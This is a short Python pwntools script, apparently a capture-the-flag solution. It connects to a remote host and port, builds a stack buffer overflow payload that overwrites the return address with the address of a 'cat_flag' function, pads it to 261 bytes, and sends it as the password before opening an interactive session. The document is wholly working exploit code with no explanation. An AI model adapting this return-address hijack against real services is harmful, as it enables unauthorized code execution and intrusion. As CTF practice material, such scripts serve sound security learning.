from pwn import *
 
p = remote("61.147.171.105",53183)
 
cat_flag_addr = 0x0804868B
 
payload = b'a' * 0x14 + 4 *b'a' + p32(cat_flag_addr) + (261-0x14-4-4)*b'a'
 
p.sendlineafter("Your choice:",'1')
 
p.sendlineafter("input your username:","test")
 
p.sendlineafter("input your passwd:",payload)
 
p.interactive()